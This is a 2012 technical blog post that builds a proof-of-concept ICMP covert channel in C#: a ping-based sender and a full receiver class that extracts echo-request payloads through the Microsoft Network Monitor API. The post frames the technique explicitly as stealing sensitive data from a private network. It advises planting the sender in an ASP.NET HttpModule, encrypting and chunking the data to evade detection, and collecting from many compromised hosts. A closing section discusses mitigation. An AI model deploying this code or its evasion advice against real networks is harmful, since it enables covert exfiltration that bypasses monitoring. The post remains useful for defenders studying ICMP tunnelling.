---
title: "ICMP for stealth transport of data"
date: 2012-03-11T14:14:00.000+01:00
tags: ["C#", "ICMP", "Network", "Security"]
author: "Bruno Garcia"
showToc: false
draft: false
cover:
    image: "Sending-and-reading-custom-icmp-payload.png"
    relative: true
    small: true
aliases:
  - /blogger/2012/icmp-for-stealth-transport-of-data/
  - /2012/03/icmp-for-stealth-transport-of-data.html
description: "Building a covert channel over ICMP in C# using raw sockets and the NetmonAPI to tunnel data through ping packets."
---

ICMP (Internet Control Message Protocol) has been used for data transfer since always. Known as [ICMP Tunnel](http://en.wikipedia.org/wiki/ICMP_tunnel), there are several projects and articles about this, mainly open source, like [ICMP-Chat](https://web.archive.org/web/20160613051415/http://freecode.com/projects/icmpchat) for unix-like that is about 10 years old now. Also [an interesting article](https://web.archive.org/web/20140714032137/http://www.sectechno.com/2010/10/31/bypassing-firewalls-using-icmp-tunnel/), explaining how to tunnel TCP over ICMP with a simple command line tool for unix-like environment, also [ported to Windows](http://neophob.com/2007/10/pingtunnel-for-windows-icmp-tunnel/).

In case you are not familiar with the idea, a description from [Wikipedia](http://en.wikipedia.org/wiki/ICMP_tunnel) follows:

> *"ICMP tunneling works by injecting arbitrary data into an echo packet sent to a remote computer."*
>
> *"This vulnerability exists because [RFC 792](http://www.ietf.org/rfc/rfc792.txt), which is IETF's rules governing ICMP packets, allows for an arbitrary data length for any type 0 (echo reply) or 8 (echo message) ICMP packets."*

It is correct to say that ICMP is normally not considered a threat, at least not by the majority of network administrators. It's common to add security mechanisms (IDS, IPS, appliances, etc) to a corporate network, but in the end all types of ICMP packets, with all payload sizes etc, pass freely at least from within the private network to the outside world. This technique is used to send sensitive data outside a private network without relying on SMTP, HTTP or other upper layer protocol that are commonly monitored and logged.

## The Sender

The sender has very simple implementation. Considering the objective is to send data to the outside world, the reply is actually irrelevant. The Sender code does not require to handle the replies.

At first I started writing the Sender code with raw sockets, having lots of fun using binary operators (`<<`, `>>`, `~`, etc), writing [one's complement](https://web.archive.org/web/20250604071232/http://mathforum.org/library/drmath/view/54379.html) and reading the [RFC 792](http://www.ietf.org/rfc/rfc792.txt). Then I found the code would only run when executing as administrator. The whole idea wouldn't make much sense if the Sender process requires elevated privilege. Take for example the ASP.NET Application Pool, as default, wouldn't be able to run it. And the worse is that this is not something new at all, `SOCK_RAW` function access was blocked to non administrator users as described by this [Microsoft knowledge base article](https://web.archive.org/web/2012/http://support.microsoft.com/default.aspx?scid=kb;en-us;Q195445) since Windows NT 4.0, which means, always.

I can still remember writing ICMP type 8 (echo request) packets with custom payload about 4 years ago, with C#, and without writing that much code anyway. So I tried the `Ping` class, introduced on .Net Framework 2.0 only to find a third parameter of type `byte[]` called `buffer`: Great! That's the payload. So this is the way to go.

A quick test with:

```csharp
new System.Net.NetworkInformation
    .Ping()
    .Send(Dns.GetHostAddresses("google.com").First(),
        300,
        Encoding.ASCII.GetBytes("teste123"));
```

On Microsoft Network Monitor I see:

![Custom ICMP payload](custom-icmp-payload.PNG)

## The Receiver

Working with ICMP is not the same as standard TCP or UDP sockets. We don't need to Bind a socket to a logical port so the operating system knows which software will handle the packets. To better describe this, I will quote [a paper](http://www.sans.org/reading_room/whitepapers/threats/icmp-attacks-illustrated_477) from SANS institute:

> *Although ICMP messages are sent in IP packets and it uses IP as if it were a higher-level protocol, ICMP is in fact an internal part of IP, and must be implemented in every IP module.*

Because of this behavior, monitoring processes and its TCP or UDP ports in use is pointless when using this technique.

When implementing the Receiver part of this PoC, I used [Microsoft Network Monitor 3.4](https://www.microsoft.com/en-us/download/details.aspx?id=4865), which has an API and already comes with a wrapper class in C# called `NetmonAPI.cs`. So if you want to run this code, install Microsoft Network Monitor, and add `NetmonAPI.cs` to your project.

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.NetworkMonitor;

namespace BrunoGarcia.Net
{
    /// <summary>
    /// Captures icmp packets of type Echo Request with its payload
    /// </summary>
    public unsafe sealed class IcmpPayloadCapturer : IDisposable
    {
        readonly IcmpPayloadCaptured _payloadCapturedCallback;
        readonly CaptureCallbackDelegate _captureHandler;
        readonly List<uint> _adapterIndex = new List<uint>();
        readonly NmCaptureMode _captureMode;
        readonly int _icmpPayloadBufferSize;
        bool _isDisposed;
        uint _icmpFilterId, _icmpPayloadFieldId, _sourceIpFieldId, _icmpTypeFieldId;
        IntPtr _engineHandle, _frameParserHandle, _nplParserHandle, _configParserHandle;

        public delegate void IcmpPayloadCaptured(IPAddress sourceAddress, string payload);

        /// <summary>
        /// Monitors NICs for ICMP packets
        /// </summary>
        public IcmpPayloadCapturer(IcmpPayloadCaptured payloadCaptured, int icmpPayloadBufferSize = 2048,
            NmCaptureMode captureMode = NmCaptureMode.LocalOnly)
        {
            _payloadCapturedCallback = payloadCaptured;
            _icmpPayloadBufferSize = icmpPayloadBufferSize;
            _captureHandler = new CaptureCallbackDelegate(CaptureCallback);
            _captureMode = captureMode;
        }

        /// <summary>
        /// Starts capture of ICMP Echo Request payload
        /// </summary>
        public void Start(IEnumerable<NetworkInterface> adapters)
        {
            if (_isDisposed)
                throw new ObjectDisposedException(GetType().FullName);

            if (NetmonAPI.NmOpenCaptureEngine(out _engineHandle) != 0)
                throw new Exception(@"Failed to load Capture Engine.");

            ConfigureParser();
            ConfigureAdapters(_engineHandle, adapters);
        }

        void ConfigureParser()
        {
            NetmonAPI.NmLoadNplParser(null, NmNplParserLoadingOption.NmAppendRegisteredNplSets,
                null, IntPtr.Zero, out _nplParserHandle);
            NetmonAPI.NmCreateFrameParserConfiguration(_nplParserHandle, null,
                IntPtr.Zero, out _configParserHandle);

            NetmonAPI.NmAddFilter(_configParserHandle, "Protocol.ICMP", out _icmpFilterId);
            NetmonAPI.NmAddField(_configParserHandle, "ICMP.Type", out _icmpTypeFieldId);
            NetmonAPI.NmAddField(_configParserHandle, "IPv4.SourceAddress", out _sourceIpFieldId);
            NetmonAPI.NmAddField(_configParserHandle, "ICMP.EchoReplyRequest.ImplementationSpecificData",
                out _icmpPayloadFieldId);

            NetmonAPI.NmCreateFrameParser(_configParserHandle, out _frameParserHandle,
                NmFrameParserOptimizeOption.ParserOptimizeFull);
        }

        void ConfigureAdapters(IntPtr engineHandle, IEnumerable<NetworkInterface> adapters)
        {
            var adapterInfo = new NM_NIC_ADAPTER_INFO
            {
                Size = (ushort)Marshal.SizeOf(typeof(NM_NIC_ADAPTER_INFO))
            };

            uint adapterCount;
            NetmonAPI.NmGetAdapterCount(engineHandle, out adapterCount);

            for (uint i = 0; i < adapterCount; i++)
            {
                NetmonAPI.NmGetAdapter(engineHandle, i, ref adapterInfo);
                if (adapters.Any(p => p.Id == string.Concat(adapterInfo.Guid.Take(38))))
                {
                    NetmonAPI.NmConfigAdapter(engineHandle, i, _captureHandler, IntPtr.Zero,
                        NmCaptureCallbackExitMode.DiscardRemainFrames);

                    if (NetmonAPI.NmStartCapture(engineHandle, i, _captureMode) == 0)
                        _adapterIndex.Add(i);
                }
            }
        }

        void CaptureCallback(IntPtr captureEngine, UInt32 ladapterIndex,
            IntPtr callerContext, IntPtr rawFrame)
        {
            IntPtr parsedFrame, insertedRawFrame;
            if (NetmonAPI.NmParseFrame(_frameParserHandle, rawFrame, uint.MinValue,
                NmFrameParsingOption.None, out parsedFrame, out insertedRawFrame) == 0)
            {
                bool passed;
                NetmonAPI.NmEvaluateFilter(parsedFrame, _icmpFilterId, out passed);
                if (passed)
                    ParseIcmpPacket(parsedFrame);

                NetmonAPI.NmCloseHandle(parsedFrame);
            }
            NetmonAPI.NmCloseHandle(rawFrame);
        }

        void ParseIcmpPacket(IntPtr parsedFrame)
        {
            ushort icmpType;
            NetmonAPI.NmGetFieldValueNumber16Bit(parsedFrame, _icmpTypeFieldId, out icmpType);

            if (icmpType == 8) // Echo Request
            {
                var bytes = new byte[_icmpPayloadBufferSize];
                fixed (byte* buffer = &bytes[0])
                {
                    uint size;
                    NetmonAPI.NmGetFieldValueByteArray(parsedFrame, _icmpPayloadFieldId,
                        (uint)_icmpPayloadBufferSize, buffer, out size);
                    uint sourceIp;
                    NetmonAPI.NmGetFieldValueNumber32Bit(parsedFrame, _sourceIpFieldId, out sourceIp);

                    _payloadCapturedCallback(
                        new IPAddress(sourceIp),
                        Encoding.ASCII.GetString(bytes, 0, (int)size));
                }
            }
        }

        ~IcmpPayloadCapturer() { Dispose(false); }

        public void Dispose() { Dispose(true); }

        private void Dispose(bool isDispose)
        {
            if (!_isDisposed)
            {
                _isDisposed = true;
                _adapterIndex.ForEach(i => NetmonAPI.NmStopCapture(_engineHandle, i));
                NetmonAPI.NmCloseHandle(_engineHandle);
                NetmonAPI.NmCloseHandle(_frameParserHandle);
                NetmonAPI.NmCloseHandle(_nplParserHandle);
                NetmonAPI.NmCloseHandle(_configParserHandle);

                if (isDispose)
                    GC.SuppressFinalize(this);
            }
        }
    }
}
```

Running from the console without *Run as Administrator*:

![Sending and Reading custom ICMP payload](Sending-and-reading-custom-icmp-payload.png)

Obviously, running the two portions of the code on the same computer does not explain clearly what goes on behind the scenes. But note that there is nothing handling the reply from the Ping code (the Sender part). The Sender thread, is pinging Google but doesn't know about the reply at all. The Receiver code, running on a different thread, using Microsoft Network Monitor 3.4 API is intercepting all ICMP type 8 packets and parsing its data field.

Now adding the Sender portion to an HttpModule as I mentioned in [previous post](http://blog.brunogarcia.com/2012/02/httpmodules-now-even-easier-to-be.html), an attacker could send sensitive data to another peer via simple ICMP echo requests. The data could be scrambled with a simple XOR or even ciphered with symmetric-key algorithm using hardcoded password or asymmetrically with a public key. Breaking large data into small chunks, would avoid fragmentation (remember MTU for Ethernet is 1500 bytes) and strangely big ICMP packets. Reordering the data on the Receiver gives great possibilities for data transfer. Even an ICMP Chat for Windows could be done, as mentioned in the introduction, exists one for unix-like systems.

## Mitigation

On Wikipedia mitigation section, I found:

> *"Although the only way to prevent this type of tunneling is to block ICMP traffic altogether, this is not realistic for a production or real-world environment. One method for mitigation of this type of attack is to only allow fixed sized ICMP packets through firewalls to virtually eliminate this type of behavior."*

I disagree that allowing only fixed size ICMP packets would avoid ICMP Tunnel since the data can be broken into smaller chunks, fixed ones, and reassembled by the Receiver. Using the code I created as PoC, we can easily change the size of the data, even writing fixed size data, by adding one layer to control sequence numbering, offset, etc. Also we can change the ICMP type by using instead of echo Request, [Destination Unreachable](http://en.wikipedia.org/wiki/ICMP_Destination_Unreachable), or any other. However, considering the idea here is the theft of information, sent from within the network (behind NAT for example), to an external system that will probably receive and log data not only from one, but from several compromised systems, echo Request fits perfectly.

It's true that there are applications and other protocols relying on ICMP to work properly. The impact of blocking ICMP completely should be assessed prior to taking such action. Still, it should be blocked when not needed, and firewall rules to allow it on each particular case it is required.
